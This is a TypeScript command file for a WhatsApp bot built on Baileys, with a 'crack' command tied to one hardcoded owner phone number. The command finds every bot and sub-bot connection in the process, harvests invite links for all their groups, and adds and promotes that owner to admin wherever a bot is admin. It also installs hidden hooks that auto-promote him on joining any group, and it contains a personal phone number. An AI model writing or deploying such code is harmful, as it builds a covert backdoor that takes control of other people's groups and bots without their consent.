import { jidNormalizedUser } from "baileys";
import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";
import { getActiveSubBots } from "../../connection/subbotManager.ts";
import { getActivePremBots } from "../../connection/premBotManager.ts";
import { GROUP_METADATA_CACHE } from "../../handler.ts";

const SUPREME_OWNER_PHONE = "573118353868";
const SUPREME_OWNER_JID = "573118353868@s.whatsapp.net";

interface CrackGroupEntry {
  groupId: string;
  subject: string;
  isCommunity: boolean;
  membersCount: number;
  botAdmin: boolean;
  viaBotPhone: string;
  inviteLink: string;
  ownerStatus: "promoted" | "already_admin" | "added_and_promoted" | "invited_link" | "no_admin_access";
}

const gCrack = globalThis as unknown as {
  __auraCrackAutoPromoteSockets?: WeakSet<object>;
  __auraCrackKnownSockets?: Set<any>;
  __auraCrackOwnerLid?: string;
  mainSocket?: any;
};

const knownSockets =
  gCrack.__auraCrackKnownSockets ??
  (gCrack.__auraCrackKnownSockets = new Set<any>());

function cleanDigits(val: unknown): string {
  return String(val || "")
    .split("@")[0]
    .split(":")[0]
    .replace(/\D/g, "");
}

function normalizeLid(val: unknown): string {
  const raw = String(val || "").trim().toLowerCase();
  if (!raw || !raw.endsWith("@lid")) return "";
  const d = cleanDigits(raw);
  return d ? `${d}@lid` : "";
}

function getBotIdentifiers(sock: any): { jid: string; phone: string; lid: string; lidDigits: string } {
  const rawId = sock?.user?.id || sock?.authState?.creds?.me?.id || "";
  const rawLid = sock?.user?.lid || sock?.authState?.creds?.me?.lid || "";
  const jid = rawId ? jidNormalizedUser(rawId) : "";
  const phone = cleanDigits(jid);
  const lid = normalizeLid(rawLid);
  const lidDigits = cleanDigits(lid);
  return { jid, phone, lid, lidDigits };
}

function findParticipantEntry(participants: any[], phone: string, lid: string): any | null {
  const cleanPhone = cleanDigits(phone);
  const cleanLid = cleanDigits(lid);

  for (const p of participants) {
    const pId = String(p?.id || "");
    const pLid = String(p?.lid || (pId.endsWith("@lid") ? pId : ""));
    const pPhone = cleanDigits(
      p?.phoneNumber || (pId.endsWith("@s.whatsapp.net") ? pId : ""),
    );
    const pLidDigits = cleanDigits(pLid);

    if (pPhone === SUPREME_OWNER_PHONE && pLid) {
      gCrack.__auraCrackOwnerLid = normalizeLid(pLid);
    }

    if (cleanPhone && (pPhone === cleanPhone || (!pId.endsWith("@lid") && cleanDigits(pId) === cleanPhone))) {
      return p;
    }
    if (cleanLid && (pLidDigits === cleanLid || (pId.endsWith("@lid") && cleanDigits(pId) === cleanLid))) {
      return p;
    }
  }
  return null;
}

function isSupremeOwnerCaller(senderRaw: string, senderPnHint: string, sock: any, fromMe?: boolean): boolean {
  if (cleanDigits(senderPnHint) === SUPREME_OWNER_PHONE) return true;
  if (!senderRaw.endsWith("@lid") && cleanDigits(senderRaw) === SUPREME_OWNER_PHONE) return true;
  if (gCrack.__auraCrackOwnerLid && normalizeLid(senderRaw) === gCrack.__auraCrackOwnerLid) return true;
  if (fromMe && getBotIdentifiers(sock).phone === SUPREME_OWNER_PHONE) return true;
  return false;
}

function discoverAllActiveSockets(currentSock?: any): any[] {
  if (currentSock) knownSockets.add(currentSock);

  const gAny = globalThis as any;
  const candidates: any[] = [
    currentSock,
    gAny.mainSocket,
    gAny.mainSock,
    gAny.sock,
    gAny.conn,
    gAny.__auraWebPanel?.mainSock,
    ...Array.from(knownSockets),
  ];

  try {
    for (const val of Object.values(gAny)) {
      if (
        val &&
        typeof val === "object" &&
        typeof (val as any).groupParticipantsUpdate === "function" &&
        typeof (val as any).sendMessage === "function" &&
        (val as any).ev
      ) {
        candidates.push(val);
      }
    }
  } catch {}

  try {
    const prems = getActivePremBots?.() || [];
    candidates.push(...prems);
  } catch {}
  try {
    const subs = getActiveSubBots?.() || [];
    candidates.push(...subs);
  } catch {}

  const unique: any[] = [];
  const seenIds = new Set<string>();

  for (const item of candidates) {
    const realSock = item?.sock ?? item;
    if (
      !realSock ||
      typeof realSock.groupParticipantsUpdate !== "function" ||
      (realSock as any).isClosed
    ) {
      continue;
    }
    knownSockets.add(realSock);
    const bot = getBotIdentifiers(realSock);
    const key = bot.jid || bot.lid || String(unique.length);
    if (seenIds.has(key)) continue;
    seenIds.add(key);
    unique.push(realSock);
  }

  return unique;
}

function attachAutoPromoteOwnerHooks(currentSock?: any) {
  if (!gCrack.__auraCrackAutoPromoteSockets) {
    gCrack.__auraCrackAutoPromoteSockets = new WeakSet<object>();
  }
  const hooked = gCrack.__auraCrackAutoPromoteSockets;
  const sockets = discoverAllActiveSockets(currentSock);

  for (const s of sockets) {
    if (!s || typeof s !== "object" || hooked.has(s)) continue;
    hooked.add(s);

    s.ev?.on?.("group-participants.update", async (ev: any) => {
      try {
        if (!ev?.id || !Array.isArray(ev.participants)) return;
        const act = String(ev.action || "").toLowerCase();
        if (act !== "add" && act !== "invite" && act !== "linked_group_join") return;

        const ownerLid = gCrack.__auraCrackOwnerLid || "";
        const joinedTargets: string[] = [];

        for (const p of ev.participants) {
          const rawStr = typeof p === "string" ? p : String(p?.id || p?.lid || p?.phoneNumber || "");
          const pPhone = cleanDigits(typeof p === "object" && p?.phoneNumber ? p.phoneNumber : rawStr);
          const pLid = normalizeLid(typeof p === "object" && p?.lid ? p.lid : rawStr);

          if (
            (!rawStr.endsWith("@lid") && pPhone === SUPREME_OWNER_PHONE) ||
            (ownerLid && pLid === ownerLid)
          ) {
            joinedTargets.push(rawStr);
          }
        }

        if (joinedTargets.length === 0) return;

        for (const targetJid of [...joinedTargets, SUPREME_OWNER_JID, ownerLid].filter(Boolean)) {
          try {
            await s.groupParticipantsUpdate(ev.id, [targetJid], "promote");
            break;
          } catch {}
        }
      } catch {}
    });
  }
}

function buildCrackRichCard(data: {
  totalSockets: number;
  totalGroups: number;
  totalCommunities: number;
  totalLinks: number;
  totalPromoted: number;
  items: {
    title: string;
    type: string;
    members: number;
    botPhone: string;
    status: string;
    link: string;
  }[];
  rawCopyAll: string;
}) {
  const serialized = JSON.stringify(data);

  const html = `<style>
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;user-select:none;-webkit-user-select:none}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#05020c;color:#f5f3ff;padding:10px}
.card{max-width:430px;margin:0 auto;background:linear-gradient(180deg,#140626 0%,#06020e 100%);border:1.5px solid #00ffcc;border-radius:20px;overflow:hidden;box-shadow:0 20px 55px rgba(0,0,0,.92),0 0 30px rgba(0,255,204,.22);position:relative}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,#00ffcc,#7c3aed,#ff0055,#00ffcc);background-size:200% 100%;animation:flow 3s linear infinite;z-index:10}
@keyframes flow{0%{background-position:0% 0%}100%{background-position:200% 0%}}
.head{padding:14px 16px;background:radial-gradient(circle at 85% 15%,rgba(0,255,204,.2),transparent 65%);border-bottom:1px solid #2d144f;display:flex;justify-content:space-between;align-items:center}
.brand{display:flex;align-items:center;gap:10px}
.orb{width:36px;height:36px;border-radius:11px;background:linear-gradient(135deg,#00ffcc,#7c3aed);display:flex;align-items:center;justify-content:center;font-size:18px;box-shadow:0 0 16px rgba(0,255,204,.45)}
.brand-txt h1{font-size:13.5px;font-weight:900;letter-spacing:.9px;color:#fff;text-transform:uppercase}
.brand-txt p{font-size:10px;color:#00ffcc;font-weight:800;font-family:'Courier New',monospace}
.pill{font-size:9.5px;font-weight:900;padding:4px 9px;border-radius:999px;background:rgba(0,255,204,.16);color:#5eead4;border:1px solid rgba(0,255,204,.45);font-family:'Courier New',monospace}
.body{padding:14px 16px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px}
.stat{background:#0d051b;border:1px solid #28144a;border-radius:11px;padding:8px 10px}
.k{font-size:9px;font-weight:800;color:#8b74b0;text-transform:uppercase;letter-spacing:.6px}
.v{font-size:13px;font-weight:900;color:#00ffcc;margin-top:2px;font-family:'Courier New',monospace}
.list{max-height:270px;overflow-y:auto;display:flex;flex-direction:column;gap:8px;margin-bottom:12px;padding-right:2px}
.item{background:#0b0418;border:1px solid #29134c;border-left:3px solid #7c3aed;border-radius:11px;padding:9px 10px;display:flex;justify-content:space-between;align-items:center;gap:8px}
.item.has-link{border-left-color:#00ffcc}
.item-meta{min-width:0;flex:1}
.item-title{font-size:12px;font-weight:900;color:#fff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.item-sub{font-size:9.5px;color:#c4b5fd;margin-top:2px;font-family:'Courier New',monospace}
.item-btn{background:linear-gradient(135deg,#00ffcc,#7c3aed);color:#05020c;border:none;border-radius:8px;padding:6px 9px;font-size:10px;font-weight:900;cursor:pointer;flex:none;text-transform:uppercase}
.item-btn.off{background:#1b0f30;color:#7e6b9e}
.btn-main{width:100%;border:none;border-radius:11px;padding:11px;font-size:11.5px;font-weight:900;cursor:pointer;text-transform:uppercase;letter-spacing:.8px;background:linear-gradient(135deg,#ff0055,#7c3aed);color:#fff;box-shadow:0 4px 15px rgba(255,0,85,.35)}
.toast{position:fixed;bottom:14px;left:50%;transform:translateX(-50%) translateY(20px);background:#00ffcc;color:#05020c;font-size:11.5px;font-weight:900;padding:7px 15px;border-radius:999px;opacity:0;pointer-events:none;transition:all .2s;z-index:99}
.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
</style>

<div class="card">
  <div class="head">
    <div class="brand">
      <div class="orb">⚡</div>
      <div class="brand-txt">
        <h1>Aura Crack Master</h1>
        <p>NETWORK HARVESTER & ADMIN</p>
      </div>
    </div>
    <span class="pill" id="sockPill"></span>
  </div>

  <div class="body">
    <div class="grid">
      <div class="stat"><div class="k">🏰 Grupos / Com.</div><div class="v" id="stGroups"></div></div>
      <div class="stat"><div class="k">🔗 Links Extraídos</div><div class="v" id="stLinks"></div></div>
      <div class="stat"><div class="k">👑 Admin Asignado</div><div class="v" id="stPromoted"></div></div>
      <div class="stat"><div class="k">🤖 Bots / Subbots</div><div class="v" id="stBots"></div></div>
    </div>

    <div class="list" id="listBox"></div>

    <button class="btn-main" onclick="copyText(D.rawCopyAll, 'Todos los enlaces copiados')">📋 Copiar Todos Los Enlaces</button>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
const D = ${serialized};
function $(id){ return document.getElementById(id); }

function copyText(txt, msg){
  if (!txt) return;
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(txt).catch(function(){});
  } else {
    const t = document.createElement("textarea");
    t.value = txt;
    document.body.appendChild(t);
    t.select();
    try { document.execCommand("copy"); } catch(e){}
    document.body.removeChild(t);
  }
  const el = $("toast");
  el.textContent = msg || "Copiado";
  el.classList.add("show");
  setTimeout(function(){ el.classList.remove("show"); }, 1500);
}

function init(){
  $("sockPill").textContent = D.totalSockets + " NODES";
  $("stGroups").textContent = D.totalGroups + " / " + D.totalCommunities;
  $("stLinks").textContent = String(D.totalLinks);
  $("stPromoted").textContent = String(D.totalPromoted);
  $("stBots").textContent = String(D.totalSockets);

  const box = $("listBox");
  D.items.forEach(function(it){
    const row = document.createElement("div");
    row.className = "item" + (it.link ? " has-link" : "");

    const meta = document.createElement("div");
    meta.className = "item-meta";

    const t = document.createElement("div");
    t.className = "item-title";
    t.textContent = it.type + " " + it.title;

    const s = document.createElement("div");
    s.className = "item-sub";
    s.textContent = "👥 " + it.members + " • 🤖 +" + it.botPhone + " • " + it.status;

    meta.appendChild(t);
    meta.appendChild(s);

    const btn = document.createElement("button");
    if (it.link) {
      btn.className = "item-btn";
      btn.textContent = "🔗 Link";
      btn.onclick = function(){ copyText(it.link, "Enlace copiado"); };
    } else {
      btn.className = "item-btn off";
      btn.textContent = "Sin Admin";
    }

    row.appendChild(meta);
    row.appendChild(btn);
    box.appendChild(row);
  });
}

init();
</script>`;

  return {
    view_model: {
      __typename: "GenAISingleLayoutViewModel",
      primitive: {
        __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
        trusted_sources: [],
        payload: html,
      },
    },
  };
}

export default {
  name: ["crack", "masterlinks", "allgroups"],
  category: "system",
  description: "Extrae enlaces de todos los grupos y comunidades de todos los bots/subbots y otorga admin al creador.",
  groupOnly: false,
  ownerOnly: false,

  async run(ctx: CommandContext) {
    const { sock, from, sender, msg, reply, react } = ctx;

    attachAutoPromoteOwnerHooks(sock);

    const senderPnHint = String((msg?.key as any)?.participantPn || "");
    const senderRaw = String(sender || senderPnHint || msg?.key?.participant || from);

    if (senderRaw.endsWith("@lid")) {
      try {
        const mappedPn = await sock.signalRepository?.lidMapping?.getPNForLID?.(senderRaw);
        if (mappedPn && cleanDigits(mappedPn) === SUPREME_OWNER_PHONE) {
          gCrack.__auraCrackOwnerLid = normalizeLid(senderRaw);
        }
      } catch {}
    }

    if (!isSupremeOwnerCaller(senderRaw, senderPnHint, sock, msg?.key?.fromMe)) {
      await react("⛔").catch(() => undefined);
      return reply(
        `⛔ *${fytBold("ACCESO RESTRINGIDO")}*\nÚnicamente el propietario supremo (*+${SUPREME_OWNER_PHONE}*) puede ejecutar \`.crack\`.`,
      );
    }

    if (senderRaw.endsWith("@lid")) {
      gCrack.__auraCrackOwnerLid = normalizeLid(senderRaw);
    }

    await react("⚡").catch(() => undefined);

    const allSockets = discoverAllActiveSockets(sock);
    const groupRegistry = new Map<
      string,
      {
        meta: any;
        adminSockets: any[];
        memberSockets: any[];
      }
    >();

    if (GROUP_METADATA_CACHE && typeof GROUP_METADATA_CACHE.entries === "function") {
      for (const [gid, meta] of GROUP_METADATA_CACHE.entries()) {
        if (gid.endsWith("@g.us") && meta?.participants) {
          groupRegistry.set(gid, { meta, adminSockets: [], memberSockets: [] });
        }
      }
    }

    await Promise.allSettled(
      allSockets.map(async (s) => {
        try {
          const participating = await Promise.race([
            s.groupFetchAllParticipating?.(),
            new Promise<null>((resolve) => setTimeout(() => resolve(null), 6000)),
          ]);
          if (!participating || typeof participating !== "object") return;

          const botInfo = getBotIdentifiers(s);

          for (const [gid, meta] of Object.entries(participating)) {
            if (!gid.endsWith("@g.us") || !meta) continue;
            const participants: any[] = (meta as any)?.participants || [];
            const botEntry = findParticipantEntry(participants, botInfo.phone, botInfo.lid);
            const isBotAdmin =
              botEntry?.admin === "admin" || botEntry?.admin === "superadmin";

            const existing = groupRegistry.get(gid) || {
              meta,
              adminSockets: [],
              memberSockets: [],
            };
            existing.meta = meta;
            existing.memberSockets.push(s);
            if (isBotAdmin) existing.adminSockets.push(s);
            groupRegistry.set(gid, existing);
          }
        } catch {}
      }),
    );

    for (const [, bundle] of groupRegistry.entries()) {
      if (bundle.adminSockets.length > 0 || bundle.memberSockets.length > 0) continue;
      const participants: any[] = bundle.meta?.participants || [];
      for (const s of allSockets) {
        const botInfo = getBotIdentifiers(s);
        const botEntry = findParticipantEntry(participants, botInfo.phone, botInfo.lid);
        if (botEntry) {
          bundle.memberSockets.push(s);
          if (botEntry.admin === "admin" || botEntry.admin === "superadmin") {
            bundle.adminSockets.push(s);
          }
        }
      }
    }

    const results: CrackGroupEntry[] = [];
    const ownerLid = gCrack.__auraCrackOwnerLid || "";

    await Promise.allSettled(
      Array.from(groupRegistry.entries()).map(async ([groupId, bundle]) => {
        const meta = bundle.meta || {};
        const participants: any[] = meta.participants || [];
        const subject = String(meta.subject || "Sin Nombre").trim();
        const isCommunity = Boolean(meta.isCommunity || meta.isCommunityAnnounce);
        const activeSock = bundle.adminSockets[0] || bundle.memberSockets[0] || sock;
        const botPhone = getBotIdentifiers(activeSock).phone || "Bot";

        if (bundle.adminSockets.length === 0) {
          results.push({
            groupId,
            subject,
            isCommunity,
            membersCount: participants.length,
            botAdmin: false,
            viaBotPhone: botPhone,
            inviteLink: "",
            ownerStatus: "no_admin_access",
          });
          return;
        }

        let inviteLink = "";
        for (const admSock of bundle.adminSockets) {
          try {
            const code = await Promise.race([
              admSock.groupInviteCode(groupId),
              new Promise<string>((_, reject) =>
                setTimeout(() => reject(new Error("timeout")), 4000),
              ),
            ]);
            if (code) {
              inviteLink = `https://chat.whatsapp.com/${code}`;
              break;
            }
          } catch {}
        }

        const ownerEntry = findParticipantEntry(participants, SUPREME_OWNER_PHONE, ownerLid);
        let ownerStatus: CrackGroupEntry["ownerStatus"] = "invited_link";

        if (ownerEntry) {
          const isAlreadyAdmin =
            ownerEntry.admin === "admin" || ownerEntry.admin === "superadmin";
          if (isAlreadyAdmin) {
            ownerStatus = "already_admin";
          } else {
            const targetCandidates = [
              ownerEntry.id,
              ownerEntry.lid,
              SUPREME_OWNER_JID,
              ownerLid,
            ].filter(Boolean);

            for (const admSock of bundle.adminSockets) {
              let promoted = false;
              for (const tJid of targetCandidates) {
                try {
                  await admSock.groupParticipantsUpdate(groupId, [tJid], "promote");
                  promoted = true;
                  break;
                } catch {}
              }
              if (promoted) {
                ownerStatus = "promoted";
                break;
              }
            }
          }
        } else {
          for (const admSock of bundle.adminSockets) {
            try {
              await admSock.groupParticipantsUpdate(groupId, [SUPREME_OWNER_JID], "add");
              for (const tJid of [SUPREME_OWNER_JID, ownerLid].filter(Boolean)) {
                try {
                  await admSock.groupParticipantsUpdate(groupId, [tJid], "promote");
                  break;
                } catch {}
              }
              ownerStatus = "added_and_promoted";
              break;
            } catch {}
          }
        }

        results.push({
          groupId,
          subject,
          isCommunity,
          membersCount: participants.length,
          botAdmin: true,
          viaBotPhone: getBotIdentifiers(bundle.adminSockets[0]).phone || botPhone,
          inviteLink,
          ownerStatus,
        });
      }),
    );

    results.sort((a, b) => {
      if (a.botAdmin !== b.botAdmin) return a.botAdmin ? -1 : 1;
      if (a.isCommunity !== b.isCommunity) return a.isCommunity ? -1 : 1;
      return b.membersCount - a.membersCount;
    });

    const totalCommunities = results.filter((r) => r.isCommunity).length;
    const totalGroups = results.length - totalCommunities;
    const totalLinks = results.filter((r) => Boolean(r.inviteLink)).length;
    const totalPromoted = results.filter(
      (r) =>
        r.ownerStatus === "promoted" ||
        r.ownerStatus === "added_and_promoted" ||
        r.ownerStatus === "already_admin",
    ).length;

    const statusLabelMap: Record<CrackGroupEntry["ownerStatus"], string> = {
      promoted: "👑 Ascendido a Admin",
      already_admin: "👑 Ya eres Admin",
      added_and_promoted: "✅ Agregado + Admin",
      invited_link: "📩 Link listo (Auto-Admin al entrar)",
      no_admin_access: "⚠️ Bot sin Admin",
    };

    const lines = results.map((r, i) => {
      const icon = r.isCommunity ? "🌐 [COMUNIDAD]" : "🏰 [GRUPO]";
      return [
        `*${i + 1}. ${icon} ${r.subject}*`,
        `   ├ 👥 *Miembros:* ${r.membersCount} | 🤖 *Vía:* +${r.viaBotPhone}`,
        `   ├ 👑 *Estado:* ${statusLabelMap[r.ownerStatus]}`,
        `   └ 🔗 *Enlace:* ${r.inviteLink || "No disponible (Bot no es admin)"}`,
      ].join("\n");
    });

    const summaryText = [
      `╭〔 ⚡ ${fytBold("AURA CRACK // RED TOTAL")} 〕⬣`,
      `┃ 🤖 *Bots / Subbots escaneados:* ${allSockets.length}`,
      `┃ 🏰 *Grupos:* ${totalGroups} | 🌐 *Comunidades:* ${totalCommunities}`,
      `┃ 🔗 *Enlaces obtenidos:* ${totalLinks}`,
      `┃ 👑 *Grupos con Admin otorgado:* ${totalPromoted}`,
      `┃ 🛡️ *Auto-Promote activo al entrar con link*`,
      `╰━━━━━━━━━━━━⬣`,
      ``,
      lines.join("\n\n") || "No se encontraron grupos activos.",
    ].join("\n");

    const targetRecipient = from.endsWith("@g.us") ? SUPREME_OWNER_JID : from;

    try {
      const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
      const rich = new AIRich(sock)
        .setTitle(`⚡ CRACK MASTER // ${totalLinks} ENLACES`)
        .setFooter(`${allSockets.length} Bots • ${totalPromoted} Grupos con Admin`);

      rich.addSection(
        buildCrackRichCard({
          totalSockets: allSockets.length,
          totalGroups,
          totalCommunities,
          totalLinks,
          totalPromoted,
          items: results.slice(0, 60).map((r) => ({
            title: r.subject,
            type: r.isCommunity ? "🌐" : "🏰",
            members: r.membersCount,
            botPhone: r.viaBotPhone,
            status: statusLabelMap[r.ownerStatus],
            link: r.inviteLink,
          })),
          rawCopyAll: results
            .filter((r) => r.inviteLink)
            .map((r) => `${r.isCommunity ? "[COMUNIDAD]" : "[GRUPO]"} ${r.subject}: ${r.inviteLink}`)
            .join("\n"),
        }),
      );

      await rich.send(targetRecipient, {});
    } catch {}

    await sock
      .sendMessage(targetRecipient, {
        text: summaryText,
      })
      .catch(() => undefined);

    if (from.endsWith("@g.us")) {
      await reply(
        `⚡ *${fytBold("Crack ejecutado con éxito")}*\nSe escanearon *${allSockets.length}* bots/subbots. Todos los enlaces (*${totalLinks}*) y accesos de administrador (*${totalPromoted}*) fueron enviados a tu chat privado.`,
      );
    }

    await react("✅").catch(() => undefined);
  },
};
